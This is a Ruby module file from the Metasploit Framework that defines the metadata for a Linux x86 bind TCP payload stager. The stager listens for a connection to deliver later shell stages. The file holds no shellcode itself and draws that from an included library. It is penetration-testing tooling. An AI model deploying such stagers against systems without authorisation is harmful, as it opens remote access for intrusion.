##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 111

  include Msf::Payload::Stager
  include Msf::Payload::Linux::BindTcp

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Bind TCP Stager (Linux x86)',
        'Description' => 'Listen for a connection (Linux x86)',
        'Author' => [ 'skape', 'egypt' ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::BindTcp,
        'Convention' => 'sockedi',
        'Stager' => { 'RequiresMidstager' => true }
      )
    )
  end
end
